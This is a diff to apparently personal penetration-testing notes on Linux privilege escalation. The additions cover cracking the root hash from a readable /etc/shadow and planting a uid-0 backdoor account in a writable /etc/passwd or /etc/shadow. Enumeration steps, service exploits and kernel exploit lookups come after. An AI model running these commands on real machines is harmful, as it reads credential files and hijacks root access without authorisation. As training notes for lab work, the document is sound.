@@ -207,19 +207,43 @@ oLink.Save
 3. or `curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh`
 4. For linSmart start with `./lse.sh -i` then `./lse.sh -i -l 1` and `./lse.sh -i -l 2` for more verbosity.  
 
-### Service Exploit
-1.  `ps aux | grep "^root"` show all processes running as root.
-2.   `./lse.sh -i -l 1`and see services running with root
-3.   `<program> --version` or  `dpkg -l | grep <program>` for debian or  `rpm –qa | grep <program>` for rpm. Enumerate version to exploit.
+
 
 
 ### Weak File Permission
-1.  `ls -l /etc/shadow` manually check if it is readable or writable
-2.  Extract the root user hash. Hash is from start of first : and before :
-3.  echo <HASH> > hash.txt
+1. ***Readable weak file Permission*** `ls -l /etc/shadow` manually check if it is readable or writable
+2.  the root user hash. Hash is from start of first : and before :
+3.  echo `'<HASH> >' hash.txt`
+4.  `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` crack the hash. If you know the type of encrtyption add e.g `--format=sha512crypt`
+5.  switch to root user using `su`
+6.  ***Writable weeak file permission***
+```
+openssl passwd evil
+echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+
+```
+or
+```
+mkpasswd -m sha-512 newpassword 
+$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/
+subl /etc/shadow # Copy the hash in to root and leave others.
+root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
+su 
+```
+7. `root::0:0:root:/root:/bin/bash` Without the `x` after root, means there is no password. `su`
+8. ***Backup files in interesting locations***
+9.   Refer to the link to see if any files are differernt/stands out https://linuxhandbook.com/linux-directory-structure/ from the below command
+10.   `ls -la /home/user`  `ls -la /` `ls -la /tmp` `ls -la /var/backups`
+### Service Exploit
+1.   If there is some unusual service, look for version numbers and look in searchsploit, google, github
+2.   `ps aux | grep "^root"` show all processes running as root.
+3.   `./lse.sh -i -l 1`and see services running with root
+4.   `<program> --version` or  `dpkg -l | grep <program>` for debian or  `rpm –qa | grep <program>` for rpm. Enumerate version to exploit.
+
 ### Kernal exploit (last resort)
 1.  https://www.exploit-db.com/exploits/44298 (check this one out :) )
-2.`uname -a` Enumerate kernel version
+2.`uname -a` `cat /etc/issue` Enumerate kernel version
 3. Find matching exploits (Google, ExploitDB, GitHub) ` searchsploit <KERNAL VERSION> priv esc` on kali
 4. https://github.com/jondonas/linux-exploit-suggester-2 . Transfer file and run
 5. `./linux-exploit-suggester-2.pl –k <KERNAL VERSION> ` (dirty cow is a popular exploit)
